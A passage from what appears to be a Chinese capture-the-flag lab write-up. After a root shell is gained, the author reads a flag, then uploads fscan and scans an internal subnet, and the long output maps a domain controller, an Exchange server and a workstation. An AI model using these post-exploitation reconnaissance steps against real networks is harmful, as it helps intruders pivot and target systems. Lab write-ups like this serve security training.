成功弹shell\n有root权限，直接读flag\n1root@iZ8vb6bns5dh59k418a97hZ:/root/flag# cat f* 2cat f* 3 ██ ██ ██ ██ ███████ ███████ ██ ████ ██ ████████ 4░░██ ██ ░██ ████ ██░░░░░██ ░██░░░░██ ████ ░██░██ ░██ ██░░░░░░██ 5 ░░██ ██ ░██ ██░░██ ██ ░░██░██ ░██ ██░░██ ░██░░██ ░██ ██ ░░ 6 ░░███ ░██ ██ ░░██ ░██ ░██░███████ ██ ░░██ ░██ ░░██ ░██░██ 7 ██░██ ░██ ██████████░██ ░██░██░░░██ ██████████░██ ░░██░██░██ █████ 8 ██ ░░██ ░██░██░░░░░░██░░██ ██ ░██ ░░██ ░██░░░░░░██░██ ░░████░░██ ░░░░██ 9 ██ ░░██░██░██ ░██ ░░███████ ░██ ░░██░██ ░██░██ ░░███ ░░████████ 10░░ ░░ ░░ ░░ ░░ ░░░░░░░ ░░ ░░ ░░ ░░ ░░ ░░░ ░░░░░░░░ 11 12 | | || | /~~\\ /\\ |\\ /|~|~ 13 | | ||--|| |/__\\ | \\/ | | 14 \\/ \\/ | | \\__// \\| |_|_ 15 16 flag01: flag{f605c397-0df7-4f55-b013-c7e45be124d0} FLAG2 root@iZ8vb6bns5dh59k418a97hZ:/tmp# ip addr\r1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1\rlink/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\rinet 127.0.0.1/8 scope host lo\rvalid_lft forever preferred_lft forever\rinet6 ::1/128 scope host valid_lft forever preferred_lft forever\r2: eth0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc mq state UP group default qlen 1000\rlink/ether 00:16:3e:1c:80:b4 brd ff:ff:ff:ff:ff:ff\rinet 172.22.3.12/16 brd 172.22.255.255 scope global eth0\rvalid_lft forever preferred_lft forever\rinet6 fe80::216:3eff:fe1c:80b4/64 scope link valid_lft forever preferred_lft forever 传个fscan信息收集一波\n1root@iZ8vb6bns5dh59k418a97hZ:/tmp# ./fscan -h 172.22.3.0/24 -eh 172.22.3.12 -p 1-65535 2┌──────────────────────────────────────────────┐ 3│ ___ _ │ 4│ / _ \\ ___ ___ _ __ __ _ ___| | __ │ 5│ / /_\\/____/ __|/ __| \u0026#39;__/ _` |/ __| |/ / │ 6│ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u0026lt; │ 7│ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │ 8└──────────────────────────────────────────────┘ 9 Fscan Version: 2.0.0 10 11[2025-04-09 00:51:47] [INFO] 暴力破解线程数: 1 12[2025-04-09 00:51:47] [INFO] 开始信息扫描 13[2025-04-09 00:51:47] [INFO] CIDR范围: 172.22.3.0-172.22.3.255 14[2025-04-09 00:51:47] [INFO] 生成IP范围: 172.22.3.0.%!d(string=172.22.3.255) - %!s(MISSING).%!d(MISSING) 15[2025-04-09 00:51:47] [INFO] 解析CIDR 172.22.3.0/24 -\u0026gt; IP范围 172.22.3.0-172.22.3.255 16[2025-04-09 00:51:48] [INFO] 已排除指定主机: 1 个 17[2025-04-09 00:51:48] [INFO] 最终有效主机数量: 255 18[2025-04-09 00:51:48] [INFO] 开始主机扫描 19[2025-04-09 00:51:48] [SUCCESS] 目标 172.22.3.2 存活 (ICMP) 20[2025-04-09 00:51:48] [SUCCESS] 目标 172.22.3.26 存活 (ICMP) 21[2025-04-09 00:51:48] [SUCCESS] 目标 172.22.3.9 存活 (ICMP) 22[2025-04-09 00:51:51] [INFO] 存活主机数量: 3 23[2025-04-09 00:51:51] [INFO] 有效端口数量: 65535 24[2025-04-09 00:51:51] [SUCCESS] 端口开放 172.22.3.9:25 25[2025-04-09 00:51:51] [SUCCESS] 端口开放 172.22.3.2:53 26[2025-04-09 00:51:51] [SUCCESS] 端口开放 172.22.3.9:80 27[2025-04-09 00:51:51] [SUCCESS] 端口开放 172.22.3.2:88 28[2025-04-09 00:51:51] [SUCCESS] 端口开放 172.22.3.9:81 29[2025-04-09 00:51:51] [SUCCESS] 服务识别 172.22.3.9:25 =\u0026gt; [smtp] 产品:Microsoft Exchange smtpd 系统:Windows 30[2025-04-09 00:51:51] [SUCCESS] 端口开放 172.22.3.2:135 31[2025-04-09 00:51:52] [SUCCESS] 端口开放 172.22.3.9:135 32[2025-04-09 00:51:52] [SUCCESS] 端口开放 172.22.3.26:139 33[2025-04-09 00:51:52] [SUCCESS] 端口开放 172.22.3.9:139 34[2025-04-09 00:51:52] [SUCCESS] 端口开放 172.22.3.2:139 35[2025-04-09 00:51:52] [SUCCESS] 端口开放 172.22.3.26:135 36[2025-04-09 00:51:55] [SUCCESS] 端口开放 172.22.3.2:389 37[2025-04-09 00:51:55] [SUCCESS] 端口开放 172.22.3.9:445 38[2025-04-09 00:51:55] [SUCCESS] 端口开放 172.22.3.26:445 39[2025-04-09 00:51:55] [SUCCESS] 端口开放 172.22.3.9:444 40[2025-04-09 00:51:55] [SUCCESS] 端口开放 172.22.3.2:445 41[2025-04-09 00:51:55] [SUCCESS] 端口开放 172.22.3.9:443 42[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.9:465 43[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.2:464 44[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.9:477 45[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.9:476 46[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.9:475 47[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.9:465 =\u0026gt; [smtp] 产品:Microsoft Exchange smtpd 系统:Windows 48[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.2:88 =\u0026gt; 49[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.9:477 =\u0026gt; [smtp] 50[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.9:476 =\u0026gt; [smtp] 51[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.9:475 =\u0026gt; [smtp] 52[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.9:587 53[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.2:593 54[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.9:593 55[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.9:81 =\u0026gt; [http] 56[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.2:636 57[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.9:587 =\u0026gt; [smtp] 产品:Microsoft Exchange smtpd 系统:Windows 58[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.9:717 59[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.2:593 =\u0026gt; [ncacn_http] 版本:1.0 产品:Microsoft Windows RPC over HTTP 系统:Windows Banner:[ncacn_http/1.0] 60[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.9:593 =\u0026gt; [ncacn_http] 版本:1.0 产品:Microsoft Windows RPC over HTTP 系统:Windows Banner:[ncacn_http/1.0] 61[2025-04-09 00:51:57] [SUCCESS] 服务识别 172.22.3.2:636 =\u0026gt; 62[2025-04-09 00:51:57] [SUCCESS] 端口开放 172.22.3.9:808 63[2025-04-09 00:51:57] [SUCCESS] 端口开放 172.22.3.9:890 64[2025-04-09 00:51:57] [SUCCESS] 服务识别 172.22.3.9:717 =\u0026gt; [smtp] 产品:Microsoft Exchange smtpd 系统:Windows 65[2025-04-09 00:51:57] [SUCCESS] 服务识别 172.22.3.26:139 =\u0026gt; Banner:[.] 66[2025-04-09 00:51:57] [SUCCESS] 服务识别 172.22.3.9:139 =\u0026gt; Banner:[.] 67[2025-04-09 00:51:57] [SUCCESS] 服务识别 172.22.3.2:139 =\u0026gt; Banner:[.] 68[2025-04-09 00:51:57] [SUCCESS] 端口开放 172.22.3.9:1801 69[2025-04-09 00:51:57] [SUCCESS] 服务识别 172.22.3.9:80 =\u0026gt; [http] 版本:10.0 产品:Microsoft IIS httpd 系统:Windows 70[2025-04-09 00:51:57] [SUCCESS] 端口开放 172.22.3.9:2103 71[2025-04-09 00:51:58] [SUCCESS] 端口开放 172.22.3.9:2107 72[2025-04-09 00:51:58] [SUCCESS] 端口开放 172.22.3.9:2105 73[2025-04-09 00:52:00] [SUCCESS] 服务识别 172.22.3.2:389 =\u0026gt; [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name 74[2025-04-09 00:52:00] [SUCCESS] 服务识别 172.22.3.9:445 =\u0026gt; 75[2025-04-09 00:52:00] [SUCCESS] 端口开放 172.22.3.9:2525 76[2025-04-09 00:52:00] [SUCCESS] 服务识别 172.22.3.26:445 =\u0026gt; 77[2025-04-09 00:52:00] [SUCCESS] 服务识别 172.22.3.9:2525 =\u0026gt; [smtp] 产品:Microsoft Exchange smtpd 系统:Windows 78[2025-04-09 00:52:00] [SUCCESS] 服务识别 172.22.3.2:445 =\u0026gt; 79[2025-04-09 00:52:00] [SUCCESS] 端口开放 172.22.3.2:3268 80[2025-04-09 00:52:01] [SUCCESS] 端口开放 172.22.3.2:3269 81[2025-04-09 00:52:01] [SUCCESS] 服务识别 172.22.3.2:3269 =\u0026gt; 82[2025-04-09 00:52:01] [SUCCESS] 服务识别 172.22.3.2:464 =\u0026gt; 83[2025-04-09 00:52:01] [SUCCESS] 端口开放 172.22.3.2:3389 84[2025-04-09 00:52:01] [SUCCESS] 端口开放 172.22.3.26:3389 85[2025-04-09 00:52:01] [SUCCESS] 端口开放 172.22.3.9:3389 86[2025-04-09 00:52:02] [SUCCESS] 服务识别 172.22.3.9:808 =\u0026gt; 87[2025-04-09 00:52:02] [SUCCESS] 服务识别 172.22.3.9:890 =\u0026gt; 88[2025-04-09 00:52:02] [SUCCESS] 端口开放 172.22.3.9:3800 89[2025-04-09 00:52:02] [SUCCESS] 端口开放 172.22.3.9:3801 90[2025-04-09 00:52:02] [SUCCESS] 端口开放 172.22.3.9:3803 91[2025-04-09 00:52:02] [SUCCESS] 端口开放 172.22.3.9:3823 92[2025-04-09 00:52:02] [SUCCESS] 端口开放 172.22.3.9:3828 93[2025-04-09 00:52:02] [SUCCESS] 端口开放 172.22.3.9:3843 94[2025-04-09 00:52:02] [SUCCESS] 端口开放 172.22.3.9:3863 95[2025-04-09 00:52:02] [SUCCESS] 端口开放 172.22.3.9:3867 96[2025-04-09 00:52:03] [SUCCESS] 端口开放 172.22.3.9:3875 97[2025-04-09 00:52:05] [SUCCESS] 服务识别 172.22.3.2:3268 =\u0026gt; [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name 98[2025-04-09 00:52:06] [SUCCESS] 服务识别 172.22.3.26:3389 =\u0026gt; 99[2025-04-09 00:52:06] [SUCCESS] 端口开放 172.22.3.9:5060 100[2025-04-09 00:52:07] [SUCCESS] 端口开放 172.22.3.9:5062 101[2025-04-09 00:52:07] [SUCCESS] 端口开放 172.22.3.9:5065 102[2025-04-09 00:52:07] [SUCCESS] 服务识别 172.22.3.9:3801 =\u0026gt; 103[2025-04-09 00:52:07] [SUCCESS] 服务识别 172.22.3.9:3803 =\u0026gt; 104[2025-04-09 00:52:07] [SUCCESS] 服务识别 172.22.3.9:1801 =\u0026gt; 105[2025-04-09 00:52:07] [SUCCESS] 服务识别 172.22.3.9:3823 =\u0026gt; 106[2025-04-09 00:52:07] [SUCCESS] 服务识别 172.22.3.9:3828 =\u0026gt; 107[2025-04-09 00:52:07] [SUCCESS] 服务识别 172.22.3.9:3843 =\u0026gt; 108[2025-04-09 00:52:07] [SUCCESS] 服务识别 172.22.3.9:3863 =\u0026gt; 109[2025-04-09 00:52:07] [SUCCESS] 服务识别 172.22.3.9:3867 =\u0026gt; 110[2025-04-09 00:52:07] [SUCCESS] 端口开放 172.22.3.9:6001 111[2025-04-09 00:52:08] [SUCCESS] 服务识别 172.22.3.9:6001 =\u0026gt; [ncacn_http] 版本:1.0 产品:Microsoft Windows RPC over HTTP 系统:Windows Banner:[ncacn_http/1.0] 112[2025-04-09 00:52:07] [SUCCESS] 端口开放 172.22.3.9:6027 113[2025-04-09 00:52:07] [SUCCESS] 端口开放 172.22.3.9:6049 114[2025-04-09 00:52:07] [SUCCESS] 端口开放 172.22.3.9:6057 115[2025-04-09 00:52:08] [SUCCESS] 端口开放 172.22.3.9:6081 116[2025-04-09 00:52:08] [SUCCESS] 端口开放 172.22.3.9:6095 117[2025-04-09 00:52:08] [SUCCESS] 端口开放 172.22.3.9:6102 118[2025-04-09 00:52:08] [SUCCESS] 端口开放 172.22.3.9:6119 119[2025-04-09 00:52:08] [SUCCESS] 端口开放 172.22.3.9:6129 120[2025-04-09 00:52:08] [SUCCESS] 端口开放 172.22.3.9:6153 121[2025-04-09 00:52:08] [SUCCESS] 端口开放 172.22.3.9:6193 122[2025-04-09 00:52:09] [SUCCESS] 端口开放 172.22.3.9:6228 123[2025-04-09 00:52:11] [SUCCESS] 端口开放 172.22.3.9:6401 124[2025-04-09 00:52:11] [SUCCESS] 端口开放 172.22.3.9:6405 125[2025-04-09 00:52:11] [SUCCESS] 端口开放 172.22.3.9:6400 126[2025-04-09 00:52:11] [SUCCESS] 端口开放 172.22.3.9:6404 127[2025-04-09 00:52:11] [SUCCESS] 端口开放 172.22.3.9:6430 128[2025-04-09 00:52:11] [SUCCESS] 服务识别 172.22.3.9:5060 =\u0026gt; 129[2025-04-09 00:52:11] [SUCCESS] 端口开放 172.22.3.9:6448 130[2025-04-09 00:52:12] [SUCCESS] 端口开放 172.22.3.9:6449 131[2025-04-09 00:52:12] [SUCCESS] 端口开放 172.22.3.9:6454 132[2025-04-09 00:52:12] [SUCCESS] 端口开放 172.22.3.9:6490 133[2025-04-09 00:52:12] [SUCCESS] 端口开放 172.22.3.9:6492 134[2025-04-09 00:52:12] [SUCCESS] 端口开放 172.22.3.9:6497 135[2025-04-09 00:52:12] [SUCCESS] 服务识别 172.22.3.9:3800 =\u0026gt; [http] 版本:2.0 产品:Microsoft HTTPAPI httpd 系统:Windows 136[2025-04-09 00:52:12] [SUCCESS] 端口开放 172.22.3.9:6512 137[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6514 138[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6548 139[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6550 140[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6560 141[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6571 142[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6564 143[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6570 144[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6572 145[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6578 146[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6590 147[2025-04-09 00:52:14] [SUCCESS] 端口开放 172.22.3.9:6594 148[2025-04-09 00:52:14] [SUCCESS] 端口开放 172.22.3.9:6606 149[2025-04-09 00:52:14] [SUCCESS] 端口开放 172.22.3.9:6616 150[2025-04-09 00:52:14] [SUCCESS] 端口开放 172.22.3.9:6621 151[2025-04-09 00:52:14] [SUCCESS] 端口开放 172.22.3.9:6624 152[2025-04-09 00:52:14] [SUCCESS] 端口开放 172.22.3.9:6642 153[2025-04-09 00:52:14] [SUCCESS] 端口开放 172.22.3.9:6664 154[2025-04-09 00:52:15] [SUCCESS] 端口开放 172.22.3.9:6685 155[2025-04-09 00:52:15] [SUCCESS] 端口开放 172.22.3.9:6690 156[2025-04-09 00:52:15] [SUCCESS] 端口开放 172.22.3.9:6719 157[2025-04-09 00:52:15] [SUCCESS] 端口开放 172.22.3.9:6728 158[2025-04-09 00:52:15] [SUCCESS] 端口开放 172.22.3.9:6741 159[2025-04-09 00:52:15] [SUCCESS] 端口开放 172.22.3.9:6770 160[2025-04-09 00:52:17] [SUCCESS] 服务识别 172.22.3.9:5062 =\u0026gt; 161[2025-04-09 00:52:17] [SUCCESS] 服务识别 172.22.3.9:5065 =\u0026gt; 162[2025-04-09 00:52:17] [SUCCESS] 端口开放 172.22.3.9:6772 163[2025-04-09 00:52:18] [SUCCESS] 端口开放 172.22.3.9:7673 164[2025-04-09 00:52:19] [SUCCESS] 服务识别 172.22.3.9:6664 =\u0026gt; 165[2025-04-09 00:52:20] [SUCCESS] 端口开放 172.22.3.9:8172 166[2025-04-09 00:52:51] [SUCCESS] 服务识别 172.22.3.2:53 =\u0026gt; 167[2025-04-09 00:52:52] [SUCCESS] 端口开放 172.22.3.2:9389 168[2025-04-09 00:52:53] [SUCCESS] 服务识别 172.22.3.9:2103 =\u0026gt; 169[2025-04-09 00:52:53] [SUCCESS] 端口开放 172.22.3.9:9710 170[2025-04-09 00:52:53] [SUCCESS] 服务识别 172.22.3.9:2107 =\u0026gt; 171[2025-04-09 00:52:55] [SUCCESS] 端口开放 172.22.3.9:12393 172[2025-04-09 00:52:55] [SUCCESS] 服务识别 172.22.3.9:444 =\u0026gt; 173[2025-04-09 00:52:56] [SUCCESS] 服务识别 172.22.3.2:135 =\u0026gt; 174[2025-04-09 00:52:57] [SUCCESS] 端口开放 172.22.3.26:15774 175[2025-04-09 00:52:57] [SUCCESS] 服务识别 172.22.3.2:9389 =\u0026gt; 176[2025-04-09 00:52:57] [SUCCESS] 服务识别 172.22.3.9:135 =\u0026gt; 177[2025-04-09 00:52:57] [SUCCESS] 服务识别 172.22.3.26:135 =\u0026gt; 178[2025-04-09 00:52:58] [SUCCESS] 服务识别 172.22.3.9:9710 =\u0026gt; 179[2025-04-09 00:52:58] [SUCCESS] 服务识别 172.22.3.9:3875 =\u0026gt; 180[2025-04-09 00:52:58] [SUCCESS] 服务识别 172.22.3.9:2105 =\u0026gt; 181[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6027 =\u0026gt; 182[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6049 =\u0026gt; 183[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6057 =\u0026gt; 184[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6081 =\u0026gt; 185[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6095 =\u0026gt; 186[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6102 =\u0026gt; 187[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6119 =\u0026gt; 188[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6129 =\u0026gt; 189[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6153 =\u0026gt; 190[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6193 =\u0026gt; 191[2025-04-09 00:53:04] [SUCCESS] 服务识别 172.22.3.9:6228 =\u0026gt; 192[2025-04-09 00:53:05] [SUCCESS] 服务识别 172.22.3.9:12393 =\u0026gt; 193[2025-04-09 00:53:06] [SUCCESS] 服务识别 172.22.3.9:6401 =\u0026gt; 194[2025-04-09 00:53:06] [SUCCESS] 服务识别 172.22.3.9:6405 =\u0026gt; 195[2025-04-09 00:53:06] [SUCCESS] 服务识别 172.22.3.9:6400 =\u0026gt; 196[2025-04-09 00:53:06] [SUCCESS] 服务识别 172.22.3.2:3389 =\u0026gt; 197[2025-04-09 00:53:06] [SUCCESS] 服务识别 172.22.3.9:6404 =\u0026gt; 198[2025-04-09 00:53:06] [SUCCESS] 服务识别 172.22.3.9:6430 =\u0026gt; 199[2025-04-09 00:53:06] [SUCCESS] 服务识别 172.22.3.9:3389 =\u0026gt; 200[2025-04-09 00:53:07] [SUCCESS] 服务识别 172.22.3.9:6448 =\u0026gt; 201[2025-04-09 00:53:07] [SUCCESS] 服务识别 172.22.3.26:15774 =\u0026gt; 202[2025-04-09 00:53:07] [SUCCESS] 服务识别 172.22.3.9:6449 =\u0026gt; 203[2025-04-09 00:53:07] [SUCCESS] 服务识别 172.22.3.9:6454 =\u0026gt; 204[2025-04-09 00:53:07] [SUCCESS] 服务识别 172.22.3.9:6490 =\u0026gt; 205[2025-04-09 00:53:07] [SUCCESS] 服务识别 172.22.3.9:6492 =\u0026gt; 206[2025-04-09 00:53:07] [SUCCESS] 服务识别 172.22.3.9:6497 =\u0026gt; 207[2025-04-09 00:53:07] [SUCCESS] 服务识别 172.22.3.9:6512 =\u0026gt; 208[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6514 =\u0026gt; 209[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6548 =\u0026gt; 210[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6550 =\u0026gt; 211[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6571 =\u0026gt; 212[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6564 =\u0026gt; 213[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6570 =\u0026gt; 214[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6572 =\u0026gt; 215[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6578 =\u0026gt; 216[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6590 =\u0026gt; 217[2025-04-09 00:53:09] [SUCCESS] 服务识别 172.22.3.9:6594 =\u0026gt; 218[2025-04-09 00:53:09] [SUCCESS] 服务识别 172.22.3.9:6606 =\u0026gt; 219[2025-04-09 00:53:09] [SUCCESS] 服务识别 172.22.3.9:6616 =\u0026gt; 220[2025-04-09 00:53:09] [SUCCESS] 服务识别 172.22.3.9:6621 =\u0026gt; 221[2025-04-09 00:53:09] [SUCCESS] 服务识别 172.22.3.9:6624 =\u0026gt; 222[2025-04-09 00:53:09] [SUCCESS] 服务识别 172.22.3.9:6642 =\u0026gt; 223[2025-04-09 00:53:10] [SUCCESS] 服务识别 172.22.3.9:6685 =\u0026gt; 224[2025-04-09 00:53:10] [SUCCESS] 服务识别 172.22.3.9:6690 =\u0026gt; 225[2025-04-09 00:53:10] [SUCCESS] 服务识别 172.22.3.9:6719 =\u0026gt; 226[2025-04-09 00:53:10] [SUCCESS] 服务识别 172.22.3.9:6728 =\u0026gt; 227[2025-04-09 00:53:10] [SUCCESS] 服务识别 172.22.3.9:6741 =\u0026gt; 228[2025-04-09 00:53:10] [SUCCESS] 服务识别 172.22.3.9:6770 =\u0026gt; 229[2025-04-09 00:53:12] [SUCCESS] 服务识别 172.22.3.9:6772 =\u0026gt; 230[2025-04-09 00:53:13] [SUCCESS] 服务识别 172.22.3.9:7673 =\u0026gt; 231[2025-04-09 00:53:13] [SUCCESS] 服务识别 172.22.3.9:6560 =\u0026gt; 232[2025-04-09 00:53:15] [SUCCESS] 服务识别 172.22.3.9:8172 =\u0026gt; 233[2025-04-09 00:53:20] [SUCCESS] 服务识别 172.22.3.9:443 =\u0026gt; 234[2025-04-09 00:53:31] [SUCCESS] 端口开放 172.22.3.2:47001 235[2025-04-09 00:53:31] [SUCCESS] 端口开放 172.22.3.26:47001 236[2025-04-09 00:53:31] [SUCCESS] 端口开放 172.22.3.9:47001 237[2025-04-09 00:53:36] [SUCCESS] 服务识别 172.22.3.2:47001 =\u0026gt; [http] 238[2025-04-09 00:53:36] [SUCCESS] 服务识别 172.22.3.9:47001 =\u0026gt; [http] 239[2025-04-09 00:53:36] [SUCCESS] 服务识别 172.22.3.26:47001 =\u0026gt; [http] 240[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49665 241[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49664 242[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49667 243[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49664 244[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49666 245[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49667 246[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49666 247[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49665 248[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49668 249[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49669 250[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49670 251[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49671 252[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49673 253[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49674 254[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49675 255[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49677 256[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49678 257[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49684 258[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49695 259[2025-04-09 00:53:39] [SUCCESS] 服务识别 172.22.3.2:49674 =\u0026gt; [ncacn_http] 版本:1.0 产品:Microsoft Windows RPC over HTTP 系统:Windows Banner:[ncacn_http/1.0] 260[2025-04-09 00:53:55] [SUCCESS] 端口开放 172.22.3.2:52352 261[2025-04-09 00:54:33] [SUCCESS] 服务识别 172.22.3.2:49665 =\u0026gt; 262[2025-04-09 00:54:33] [SUCCESS] 服务识别 172.22.3.26:49664 =\u0026gt; 263[2025-04-09 00:54:33] [SUCCESS] 服务识别 172.22.3.2:49667 =\u0026gt; 264[2025-04-09 00:54:33] [SUCCESS] 服务识别 172.22.3.2:49664 =\u0026gt; 265[2025-04-09 00:54:33] [SUCCESS] 服务识别 172.22.3.2:49666 =\u0026gt; 266[2025-04-09 00:54:33] [SUCCESS] 服务识别 172.22.3.26:49667 =\u0026gt; 267[2025-04-09 00:54:33] [SUCCESS] 服务识别 172.22.3.26:49666 =\u0026gt; 268[2025-04-09 00:54:33] [SUCCESS] 服务识别 172.22.3.26:49665 =\u0026gt; 269[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.26:49668 =\u0026gt; 270[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.26:49669 =\u0026gt; 271[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.26:49670 =\u0026gt; 272[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.2:49671 =\u0026gt; 273[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.26:49673 =\u0026gt; 274[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.2:49675 =\u0026gt; 275[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.2:49677 =\u0026gt; 276[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.26:49678 =\u0026gt; 277[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.2:49684 =\u0026gt; 278[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.2:49695 =\u0026gt; 279[2025-04-09 00:54:46] [SUCCESS] 端口开放 172.22.3.9:64327 280[2025-04-09 00:54:46] [SUCCESS] 端口开放 172.22.3.9:64337 281[2025-04-09 00:54:50] [SUCCESS] 服务识别 172.22.3.2:52352 =\u0026gt; 282[2025-04-09 00:54:51] [SUCCESS] 服务识别 172.22.3.9:64337 =\u0026gt; 283[2025-04-09 00:55:41] [SUCCESS] 服务识别 172.22.3.9:64327 =\u0026gt; 284[2025-04-09 00:55:41] [INFO] 存活端口数量: 130 285[2025-04-09 00:55:41] [INFO] 开始漏洞扫描 286[2025-04-09 00:55:41] [INFO] 加载的插件: findnet, ldap, ms17010, netbios, rdp, smb, smb2, smbghost, smtp, webpoc, webtitle 287[2025-04-09 00:55:41] [SUCCESS] 网站标题 http://172.22.3.9 状态码:403 长度:0 标题:无标题 288[2025-04-09 00:55:41] [SUCCESS] NetInfo 扫描结果 289目标主机: 172.22.3.9 290主机名: XIAORANG-EXC01 291发现的网络接口: 292 IPv4地址: 293 └─ 172.22.3.9 294[2025-04-09 00:55:41] [SUCCESS] NetInfo 扫描结果 295目标主机: 172.22.3.2 296主机名: XIAORANG-WIN16 297发现的网络接口: 298 IPv4地址: 299 └─ 172.22.3.2 300[2025-04-09 00:55:41] [INFO] 系统信息 172.22.3.2 [Windows Server 2016 Datacenter 14393] 301[2025-04-09 00:55:41] [SUCCESS] NetBios 172.22.3.26 XIAORANG\\XIAORANG-PC 302[2025-04-09 00:55:41] [SUCCESS] NetBios 172.22.3.2 DC:XIAORANG-WIN16.xiaorang.lab Windows Server 2016 Datacenter 14393 303[2025-04-09 00:55:41] [SUCCESS] 网站标题 http://172.22.3.9:81 状态码:403 长度:1157 标题:403 - 禁止访问: 访问被拒绝。 304[2025-04-09 00:55:41] [SUCCESS] NetInfo 扫描结果 305目标主机: 172.22.3.26 306主机名: XIAORANG-PC 307发现的网络接口: 308 IPv4地址: 309 └─ 172.22.3.26 310[2025-04-09 00:55:41] [SUCCESS] NetBios 172.22.3.9 XIAORANG-EXC01.xiaorang.lab Windows Server 2016 Datacenter 14393 311[2025-04-09 00:55:42] [SUCCESS] SMTP服务 172.22.3.9:25 允许匿名访问 312[2025-04-09 00:55:42] [SUCCESS] 网站标题 https://172.22.3.9 状态码:302 长度:0 标题:无标题 重定向地址: https://172.22.3.9/owa/ 313[2025-04-09 00:55:42] [SUCCESS] 网站标题 